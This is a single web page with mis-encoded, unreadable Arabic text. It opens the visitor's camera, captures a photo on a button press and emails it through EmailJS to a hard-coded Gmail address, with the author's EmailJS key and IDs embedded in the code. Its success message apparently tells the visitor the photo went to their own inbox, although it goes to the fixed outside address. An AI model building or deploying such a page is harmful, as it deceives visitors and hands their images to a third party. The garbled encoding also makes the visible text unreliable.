<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø§Ù„ØªÙ‚Ø§Ø· ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¹Ø¨Ø± Ø§Ù„Ø¨Ø±ÙŠØ¯</title>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        // ğŸ”‘ ØªÙ… Ø§Ø³ØªØ¨Ø¯Ø§Ù„ Ø§Ù„Ù…ÙØªØ§Ø­ Ø§Ù„Ø¹Ø§Ù… (Public Key)
        (function() {
            emailjs.init("WF5J_sXl1iz-prrm"); 
        })();
    </script>

    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background-color: #121212; color: #e0e0e0; padding: 20px; }
        h1 { color: #00bcd4; }
        .camera-feed { margin: 20px auto; width: 90%; max-width: 600px; border: 5px solid #00bcd4; background-color: #000; }
        video { width: 100%; display: block; }
        button { padding: 12px 25px; font-size: 18px; cursor: pointer; background-color: #4caf50; color: white; border: none; border-radius: 8px; margin-top: 15px; transition: background-color 0.3s; }
        button:hover { background-color: #45a049; }
        #status { margin-top: 20px; font-weight: bold; font-size: 1.1em; color: #ffeb3b; }
    </style>
</head>
<body>

    <h1>ğŸ“¸ Ø§Ù„ØªÙ‚Ø· ØµÙˆØ±ØªÙƒ Ø§Ù„Ø¢Ù† ğŸ“¸</h1>
    <p>ÙŠÙØ±Ø¬Ù‰ Ø§Ù„Ù†Ù‚Ø± Ø¹Ù„Ù‰ "Ø³Ù…Ø§Ø­" Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø«Ù… Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø²Ø± Ø§Ù„Ø¥Ø±Ø³Ø§Ù„.</p>

    <div class="camera-feed">
        <video id="videoElement" autoplay></video>
    </div>

    <button onclick="captureAndSend()">Ø§Ù„ØªÙ‚Ø§Ø· ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¹Ø¨Ø± Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„</button>
    <div id="status"></div>

    <script>
        const video = document.getElementById('videoElement');
        const statusDiv = document.getElementById('status');
        let stream;

        // Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(s) {
                stream = s;
                video.srcObject = stream;
                statusDiv.textContent = 'Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¬Ø§Ù‡Ø²Ø©. ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©.';
            })
            .catch(function(err) {
                statusDiv.textContent = 'âŒ Ø®Ø·Ø£: Ù„Ù… Ù†ØªÙ…ÙƒÙ† Ù…Ù† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§. ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª.';
                console.error("Ø®Ø·Ø£: " + err);
            });

        // Ø§Ù„ØªÙ‚Ø§Ø· ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©
        function captureAndSend() {
            if (!stream) {
                statusDiv.textContent = 'âŒ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ØºÙŠØ± Ù…ØªØ§Ø­Ø© Ù„Ù„Ø¥Ø±Ø³Ø§Ù„.';
                return;
            }

            // Ø¥Ù†Ø´Ø§Ø¡ Ø¹Ù†ØµØ± Canvas Ù„Ø£Ø®Ø° Ù„Ù‚Ø·Ø© Ø¹Ø§Ù„ÙŠØ© Ø§Ù„Ø¬ÙˆØ¯Ø©
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            
            // Ø±Ø³Ù… Ø¥Ø·Ø§Ø± Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¹Ù„Ù‰ Canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // ØªØµØ¯ÙŠØ± Ø§Ù„ØµÙˆØ±Ø© ÙƒØ¨ÙŠØ§Ù†Ø§Øª Data URL Ø¨Ø¬ÙˆØ¯Ø© Ø¹Ø§Ù„ÙŠØ© (0.95)
            const imageDataURL = canvas.toDataURL('image/jpeg', 0.95);

            statusDiv.textContent = 'â³ Ø¬Ø§Ø±Ù Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¹Ø¨Ø± Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ...';

            // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù€ EmailJS
            const templateParams = {
                // Ø§Ù„Ù…ØªØºÙŠØ± Ø§Ù„Ø°ÙŠ Ø³ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ù…Ø´ÙØ±Ø©
                image_data: imageDataURL,
                subject: "ØµÙˆØ±Ø© Ù…Ù„ØªÙ‚Ø·Ø© Ø­Ø¯ÙŠØ«Ø§Ù‹",
                to_email: "dkk43533@gmail.com" // Ø¨Ø±ÙŠØ¯Ùƒ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø§Ù„Ø°ÙŠ ÙŠØ³ØªÙ‚Ø¨Ù„ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª
            };

            // ğŸ”‘ ØªÙ… Ø§Ø³ØªØ¨Ø¯Ø§Ù„ Ù…Ø¹Ø±Ù‘Ù Ø§Ù„Ø®Ø¯Ù…Ø© (Service ID) ÙˆÙ…Ø¹Ø±Ù‘Ù Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ (Template ID) 
            const serviceID = 'service_9e2nevs'; 
            const templateID = 'template_0w8m0jj'; 

            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ
            emailjs.send(serviceID, templateID, templateParams)
                .then(function(response) {
                    statusDiv.textContent = 'âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¨Ù†Ø¬Ø§Ø­ Ø¥Ù„Ù‰ Ø¨Ø±ÙŠØ¯Ùƒ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ!';
                    console.log('SUCCESS!', response.status, response.text);
                }, function(error) {
                    statusDiv.textContent = 'âŒ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„. ØªØ­Ù‚Ù‚ Ù…Ù† Ø§ØªØµØ§Ù„Ùƒ Ø¨Ø§Ù„Ø¥Ù†ØªØ±Ù†Øª ÙˆÙ…Ù† Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª EmailJS.';
                    console.log('FAILED...', error);
                });
        }
    </script>
</body>
</html>
